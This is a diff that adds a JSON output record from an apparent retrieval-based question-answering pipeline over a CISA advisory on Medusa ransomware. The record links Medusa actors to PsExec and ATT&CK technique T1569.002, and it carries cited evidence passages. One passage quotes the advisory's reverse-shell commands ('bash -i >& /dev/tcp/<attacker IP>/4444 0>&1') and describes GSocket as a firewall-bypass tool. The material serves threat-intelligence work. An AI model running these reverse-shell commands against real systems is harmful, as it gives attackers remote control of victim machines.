@@ -1,0 +1,130 @@
+{
+  "answer": "Medusa actors use PsExec to move laterally through the network. [E5, E6]\nThe ATT&CK technique connected to Medusa actors through the reported use of PsExec is T1569.002. [E5, E6]\nThe two-hop actor-to-software-to-technique path is: Medusa actors (N1) --USES--> PsExec (N2) --USES--> T1569.002. [E1, E2, E3, E5]",
+  "claims": [
+    {
+      "text": "Medusa actors use PsExec to move laterally through the network.",
+      "citations": [
+        "E5",
+        "E6"
+      ]
+    },
+    {
+      "text": "The ATT&CK technique connected to Medusa actors through the reported use of PsExec is T1569.002.",
+      "citations": [
+        "E5",
+        "E6"
+      ]
+    },
+    {
+      "text": "The two-hop actor-to-software-to-technique path is: Medusa actors (N1) --USES--> PsExec (N2) --USES--> T1569.002.",
+      "citations": [
+        "E1",
+        "E2",
+        "E3",
+        "E5"
+      ]
+    }
+  ],
+  "evidence": {
+    "passages": [
+      {
+        "citation_id": "E1",
+        "doc_id": "AA25-071A",
+        "chunk_id": "AA25-071A:evaluation:llama500:14289:16172",
+        "source_url": "https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a",
+        "text": "When provided with valid username and password credentials, Medusa actors use PsExec to:",
+        "start": 14430,
+        "end": 14518,
+        "source_kind": "cisa"
+      },
+      {
+        "citation_id": "E2",
+        "doc_id": "AA25-071A",
+        "chunk_id": "AA25-071A:evaluation:llama500:14289:16172",
+        "source_url": "https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a",
+        "text": "#StopRansomware: Medusa Ransomware",
+        "start": 23,
+        "end": 57,
+        "source_kind": "cisa"
+      },
+      {
+        "citation_id": "E3",
+        "doc_id": "AA25-071A",
+        "chunk_id": "AA25-071A:evaluation:llama500:14289:16172",
+        "source_url": "https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a",
+        "text": "Technical Details",
+        "start": 4834,
+        "end": 4851,
+        "source_kind": "cisa"
+      },
+      {
+        "citation_id": "E4",
+        "doc_id": "AA25-071A",
+        "chunk_id": "retrieval:fc2b809533851678cac583904747bbb2672cbb860cb651a9e444d50b94a5f76f",
+        "source_url": "https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a",
+        "text": "\nNote: This advisory uses the MITRE ATT&CK® Matrix for Enterprise framework, version 19. See the MITRE ATT&CK Tactics and Techniques section of this advisory for a table of the threat actors’ activity mapped to MITRE ATT&CK tactics and techniques.\nBackground\n(Updated Aug. 18, 2026) Since 2021, Medusa actors have used the Medusa variant to conduct ransomware attacks through at least April 2026. Medusa originally operated as a closed ransomware operation, meaning the same group of cyber threat actors controlled all development and associated ransomware campaigns. Since at least early 2023, Medusa progressed to using an affiliate model, selling RaaS to affiliates who are granted varying levels of trust based upon experience and profitability. For newer or less experienced affiliates, important operations such as ransom negotiation may be centrally controlled by the developers. Medusa actors use a double-extortion model where they encr",
+        "start": 4851,
+        "end": 5796,
+        "source_kind": "cisa"
+      },
+      {
+        "citation_id": "E5",
+        "doc_id": "AA25-071A",
+        "chunk_id": "retrieval:4615a02d5a22dfb14c804fb7df0549739ac24246bf1c3c39525f053215db18b2",
+        "source_url": "https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a",
+        "text": "-able, BeyondTrust, SimpleHelp, and Splashtop. Medusa actors use these tools—in combination with Remote Desktop Protocol (RDP) [T1021.001] and PsExec [T1569.002]—to move laterally [TA0008] through the network and identify files for exfiltration [TA0010] and encryption [T1486]. When provided with valid username and password credentials, Medusa actors use PsExec to:\n",
+        "start": 14152,
+        "end": 14519,
+        "source_kind": "cisa"
+      },
+      {
+        "citation_id": "E6",
+        "doc_id": "AA25-071A",
+        "chunk_id": "retrieval:6bdb5fad270ade25cb06e52322202a2857319e99bda1e9b4d8fc511b4aa852b3",
+        "source_url": "https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a",
+        "text": "commands to create a reverse Transmission Control Protocol (TCP) connection to threat actor infrastructure:\nbash -i >& /dev/tcp/<attacker IP>/4444 0>&1\nbash -i >& /dev/tcp/<attacker IP>/443 0>&1\nGSocket\nAlso known as Global Socket or gs-netcat.\nAllows workstations on different private networks to connect and bypass firewalls.\nAllows file transfers and command execution.\nLateral Movement, Credential Access, and Execution\n(Updated Aug. 18, 2026) Medusa actors use a variety of legitimate remote monitoring and management (RMM) software [T1219]. To evade detection, they may tailor their choice based on remote access tools already present in the victim environment. 2,3 FBI identified Medusa actors using remote access software AnyDesk, Atera, ConnectWise, eHorus, N-able, BeyondTrust, SimpleHelp, and Splashtop. Medusa actors use these tools—in combination with Remote Desktop Protocol (RDP) [T1021.001] and Ps",
+        "start": 13384,
+        "end": 14297,
+        "source_kind": "cisa"
+      }
+    ],
+    "paths": [
+      {
+        "path_id": "P1",
+        "edges": [
+          {
+            "head_id": "local:AA25-071A:medusa-actors",
+            "predicate": "USES",
+            "tail_id": "attack:S0029",
+            "assertion_ids": [
+              "assertion:e83a0a54ea9d57d554e61c7b03d4a480149a5a387a89ef75364836a26e669c56"
+            ],
+            "citation_ids": [
+              "E1",
+              "E2",
+              "E3"
+            ]
+          }
+        ]
+      }
+    ],
+    "citation_ids": [
+      "E1",
+      "E2",
+      "E3",
+      "E4",
+      "E5",
+      "E6"
+    ],
+    "retrieval_ms": 677.6139999856241,
+    "configuration_hash": "d7c2718aa3b0e406681080d129a0119a06ba5e48c6e2c626bcf8bc5d34359f09",
+    "corpus_version": "cisa-selected-2026-10-03"
+  },
+  "abstained": false,
+  "execution_time_ms": 3238.307399995392,
+  "generation_timestamp": "2026-10-16T05:15:39.729935Z",
+  "warnings": [
+    "Development hybrid pipeline; final evaluation remains pending.",
+    "Source checks passed; generated-answer semantics require human review."
+  ]
+}
